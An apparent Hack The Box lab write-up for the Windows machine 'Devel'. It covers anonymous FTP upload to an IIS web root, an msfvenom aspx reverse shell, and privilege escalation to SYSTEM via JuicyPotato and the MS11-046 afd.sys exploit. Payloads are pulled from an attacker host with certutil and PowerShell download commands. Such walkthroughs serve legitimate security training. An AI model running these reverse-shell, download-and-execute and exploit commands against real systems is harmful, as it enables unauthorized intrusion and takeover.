---
layout: default
title: Devel
parent: Hack The Box - Windows
nav_order: 1
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/HTB]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 10.129.46.239

Nmap scan report for 10.129.46.239

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

# Enumeration

---

## FTP | 21

The files in the FTP server appear to be root level IIS server files.

Test if we can PUT a file to the FTP server and see it at the root level of the web app.

```bash
┌──(vagrant㉿kali)-[~/Documents/HTB/windows/devel]
└─$ ftp 10.129.46.239
Connected to 10.129.46.239.

Name (10.129.46.239:vagrant): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
100% |***********************************************************|     6      114.88 KiB/s    --:-- ETA
226 Transfer complete.
6 bytes sent in 00:00 (0.04 KiB/s)

```

![test](../../../assets/images/ctfs/hack_the_box/devel/test.png)

# Exploitation

---

Since we have write access to the root directory of the web server we should be able to upload a web shell.

Let's use MSFvenom to generate an _aspx_ payload.

```bash
┌──(vagrant㉿kali)-[~/Documents/HTB/windows/devel]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=9001 -f aspx -o reverse-shell.aspx[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2735 bytes
Saved as: reverse-shell.aspx

```

Upload the payload to the FTP server.

```bash

┌──(vagrant㉿kali)-[~/Documents/HTB/windows/devel]
└─$ ftp 10.129.46.239
Connected to 10.129.46.239.
220 Microsoft FTP Service
Name (10.129.46.239:vagrant): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put reverse-shell.aspx
local: reverse-shell.aspx remote: reverse-shell.aspx
229 Entering Extended Passive Mode (|||49160|)
150 Opening ASCII mode data connection.
100% |****************************\*\*\*****************************| 2773 36.22 MiB/s --:-- ETA
226 Transfer complete.
2773 bytes sent in 00:00 (21.36 KiB/s)

```

Execute the reverse shell in the web application...

![execute](../../../assets/images/ctfs/hack_the_box/devel/execute.png)

Receive the reverse shell on the netcat listener...

```bash
┌──(vagrant㉿kali)-[~/Documents/HTB/windows/devel]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.9] from (UNKNOWN) [10.129.46.239] 49161
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web

```

# Post-Exploitation

---

- systeminfo

```bash
c:\windows\system32\inetsrv>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
System Type:               X86-based PC
Hotfix(s):                 N/A

```

```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========

SeImpersonatePrivilege        Impersonate a client after authentication Enabled


```

Based on the system information and user privileges there are two different privilege escalation paths.

## Path 1: JuicyPotato

Since our current user has _SeImpersonatePrivilege_ privileges we should be able to execute JuicyPotato exploit

1. Download the 32-bit JuicyPotato.exe payload
2. Create MSFvenom reverse shell payload
3. Upload exploit
4. Obtain a system CLSID for Windows 7 Enterprise
5. Run the exploit

We can download the 32-bit JuicyPotato.exe payload from the following Github repository

https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2

Generate the reverse shell payload

```bash
┌──(vagrant㉿kali)-[~/Documents/HTB/windows/devel]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=9002 -f exe -a x86 --platform windows -o privesc.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: privesc.exe

```

Upload the reverse shell payload the JuicyPotato exploit

```bash
# Upload the privesc.exe reverse shell payload
c:\Windows\Temp>certutil -urlcache -f http://10.10.14.9:8000/privesc.exe privesc.exe
certutil -urlcache -f http://10.10.14.9:8000/privesc.exe privesc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

# Upload the JuicyPotato exploit
c:\Windows\Temp>certutil -urlcache -f http://10.10.14.9:8000/jpx86.exe jpx86.exe
certutil -urlcache -f http://10.10.14.9:8000/jpx86.exe jpx86.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

```

Here is the list of Windows 7 Enterprise system CLSID

https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise/

Run the JuicyPotato exploit and get a reverse shell

```bash
# Execute the JuicyPotato exploit on the target
c:\Windows\Temp>.\jpx86.exe -l 1337 -p privesc.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}

# Receive reverse shell on second netcat listener
┌──(vagrant㉿kali)-[~/Documents/HTB/windows/devel]
└─$ nc -nlvp 9002
listening on [any] 9002 ...
connect to [10.10.14.9] from (UNKNOWN) [10.129.46.239] 49206
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

## Path 2: MS11-046 Exploit

Since this machine is running Windows 7 Build 7600 without any hot fixes it should be vulnerable to MS11-046

Searchsploit MS11-046

```bash
┌──(vagrant㉿kali)-[~/Documents/HTB/windows/devel]
└─$ searchsploit ms11-046
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11- | windows_x86/local/40564.c
Microsoft Windows - 'afd.sys' Local Kernel (PoC) (MS11-046)           | windows/dos/18755.c

```

Download the first exploit 40564 to the current directory

```bash
┌──(vagrant㉿kali)-[~/Documents/HTB/windows/devel]
└─$ searchsploit -m 40564
  Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
      URL: https://www.exploit-db.com/exploits/40564
     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
    Codes: CVE-2011-1249, MS11-046
 Verified: True
File Type: C source, ASCII text
Copied to: /home/vagrant/Documents/HTB/windows/devel/40564.c

```

Install mingw-w64 to compile the exploit

```bash
┌──(vagrant㉿kali)-[~/Documents/HTB/windows/devel]
└─$ sudo apt-get install mingw-w64
```

Compile the exploit

```bash
┌──(vagrant㉿kali)-[~/Documents/HTB/windows/devel]
└─$ i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

Upload and execute the exploit

```bash
C:\Windows\Temp>powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.9:8000/40
564.exe', '40564.exe')"
```

Run exploit and get system shell

```bash
C:\Windows\Temp>40564.exe
40564.exe

c:\Windows\System32>whoami
whoami
nt authority\system

```
